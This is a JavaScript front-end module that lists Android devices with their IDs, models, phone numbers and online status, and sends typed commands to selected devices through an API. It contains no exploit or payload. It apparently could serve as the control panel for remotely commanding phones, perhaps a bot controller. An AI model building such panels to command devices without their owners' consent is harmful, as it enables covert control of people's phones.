const DevicesManager = {
    currentPage: 1,
    perPage: 20,
    allDevices: [],
    filteredDevices: [],
    
    async load() {
        const search = document.getElementById('deviceSearch').value;
        try {
            const data = await API.getDevices(this.currentPage, this.perPage, search);
            
            if (data.error) {
                console.error('API error:', data.error);
                this.allDevices = [];
                this.filteredDevices = [];
                this.render();
                return;
            }
            
            this.allDevices = Array.isArray(data.devices) ? data.devices : [];
            this.filteredDevices = this.allDevices;
            this.render();
            
            const totalPages = data.totalPages || 0;
            const total = data.total || 0;
            Pagination.render('devicesPagination', this.currentPage, totalPages, total, (page) => {
                this.currentPage = page;
                this.load();
            });
            DeviceCountManager.update();
        } catch (error) {
            console.error('Error loading devices:', error);
            this.allDevices = [];
            this.filteredDevices = [];
            this.render();
        }
    },
    
    render() {
        const tbody = document.getElementById('devicesTableBody');
        if (!tbody) return;
        
        tbody.innerHTML = '';
        
        if (!Array.isArray(this.filteredDevices) || this.filteredDevices.length === 0) {
            const tr = document.createElement('tr');
            tr.innerHTML = '<td colspan="6" style="text-align: center; padding: 20px;">No devices found</td>';
            tbody.appendChild(tr);
            this.updateSelectAllState();
            return;
        }
        
        this.filteredDevices.forEach(device => {
            if (!device) return;
            
            const tr = document.createElement('tr');
            const androidId = String(device.android_id || '');
            const onlineDate = device.online ? new Date(device.online) : null;
            const online = onlineDate && !isNaN(onlineDate.getTime()) 
                ? onlineDate > new Date(Date.now() - 1 * 60 * 1000)
                : false;
            const onlineText = online ? 'Online' : 'Offline';
            const onlineClass = online ? 'online' : 'offline';
            
            const model = String(device.model || '-').substring(0, 100);
            const phoneNumbers = String(device.phone_numbers || '-').substring(0, 100);
            const cmd = String(device.cmd || '-').substring(0, 200);
            
            tr.innerHTML = `
                <td class="checkbox-cell">
                    <input type="checkbox" class="device-checkbox" value="${androidId.replace(/"/g, '&quot;')}" onchange="DevicesManager.updateSelectAllState()">
                </td>
                <td><span class="android-id">${androidId.substring(0, 50)}</span></td>
                <td>${model.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</td>
                <td><span class="phone-numbers">${phoneNumbers.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</span></td>
                <td><span class="${onlineClass}">${onlineText}</span></td>
                <td class="command-cell">${cmd.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</td>
            `;
            tbody.appendChild(tr);
        });
        
        this.updateSelectAllState();
    },
    
    filter() {
        this.currentPage = 1;
        this.load();
    },
    
    selectAll() {
        document.querySelectorAll('.device-checkbox').forEach(cb => {
            cb.checked = true;
            cb.closest('tr').classList.add('selected');
        });
        document.getElementById('selectAllCheckbox').checked = true;
        this.updateSelectAllState();
    },
    
    deselectAll() {
        document.querySelectorAll('.device-checkbox').forEach(cb => {
            cb.checked = false;
            cb.closest('tr').classList.remove('selected');
        });
        document.getElementById('selectAllCheckbox').checked = false;
        this.updateSelectAllState();
    },
    
    toggleSelectAll() {
        const selectAll = document.getElementById('selectAllCheckbox').checked;
        document.querySelectorAll('.device-checkbox').forEach(cb => {
            cb.checked = selectAll;
            if (selectAll) {
                cb.closest('tr').classList.add('selected');
            } else {
                cb.closest('tr').classList.remove('selected');
            }
        });
        this.updateSelectAllState();
    },
    
    updateSelectAllState() {
        const checkboxes = document.querySelectorAll('.device-checkbox');
        const checked = document.querySelectorAll('.device-checkbox:checked');
        document.getElementById('selectAllCheckbox').checked = checkboxes.length === checked.length;
        
        const sendBtn = document.getElementById('sendCommandBtn');
        sendBtn.disabled = checked.length === 0;
        
        checkboxes.forEach(cb => {
            if (cb.checked) {
                cb.closest('tr').classList.add('selected');
            } else {
                cb.closest('tr').classList.remove('selected');
            }
        });
    },
    
    getSelectedDevices() {
        return Array.from(document.querySelectorAll('.device-checkbox:checked'))
            .map(cb => cb.value);
    },
    
    async sendCommand(command) {
        const selectedDevices = this.getSelectedDevices();
        
        if (selectedDevices.length === 0) {
            alert('Please select at least one device');
            return;
        }
        
        if (!command || !command.trim()) {
            alert('Please enter a command');
            return;
        }
        
        try {
            const data = await API.sendCommand(selectedDevices, command.trim());
            if (data.success) {
                alert(`Command sent successfully to ${data.updated} device(s)`);
                closeCommandModal();
                this.deselectAll();
                this.load();
            } else {
                alert('Error: ' + (data.error || 'Failed to send command'));
            }
        } catch (error) {
            console.error('Error sending command:', error);
            alert('Error sending command');
        }
    }
};

